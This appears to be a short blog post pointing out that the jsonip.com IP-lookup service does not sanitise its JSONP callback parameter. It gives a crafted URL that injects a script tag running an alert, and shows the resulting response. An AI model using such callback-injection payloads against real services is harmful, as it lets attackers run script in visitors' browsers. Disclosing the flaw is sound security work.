JSONIP.com is simple yet brilliant.
it just response with an IP, in a JSON format, or JavaScript (for callback).

http://jsonip.com
or http://jsonip.com/?callback=aaa

this enables either mobile or web applications to use some more extensive information,
as part of analytics and track the IP, along with other parameters..

its so simple to generate the same result using a PHP script,
optionally wrapping it with callback.

this aside, the service is totally unprotected, and can be EASILY be used to inject JavaScript code,
at client-side.

for example:
<a href="http://jsonip.com/?callback=%3Cscript%3E(function(){alert(%22you%20suck%20as%20a%20service!%22);}())%3C/script%3Econsole.log" title="http://jsonip.com/?callback=%3Cscript%3E(function(){alert(%22you%20suck%20as%20a%20service!%22);}())%3C/script%3Econsole.log" target="_blank">http://jsonip.com/?callback=%3Cscript%3E(function(){alert(%22you%20suck%20as%20a%20service!%22);}())%3C/script%3Econsole.log</a>

will generate:
<pre><span style='color:#a65700; '>&lt;</span><span style='color:#800000; font-weight:bold; '>script</span><span style='color:#a65700; '>></span><span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>function</span><span style='color:#808030; '>(</span><span style='color:#808030; '>)</span><span style='color:#800080; '>{</span>alert<span style='color:#808030; '>(</span><span style='color:#800000; '>"</span><span style='color:#0000e6; '>you suck as a service!</span><span style='color:#800000; '>"</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span><span style='color:#800080; '>}</span><span style='color:#808030; '>(</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#a65700; '>&lt;/</span><span style='color:#800000; font-weight:bold; '>script</span><span style='color:#a65700; '>></span>console<span style='color:#008c00; '>.</span>log({"ip":"<span style='color:#008c00; '>87.126.103.21</span>","about":"/about","Pro!":"http://getjsonip<span style='color:#008c00; '>.</span>com"})</pre>
ready to be executed..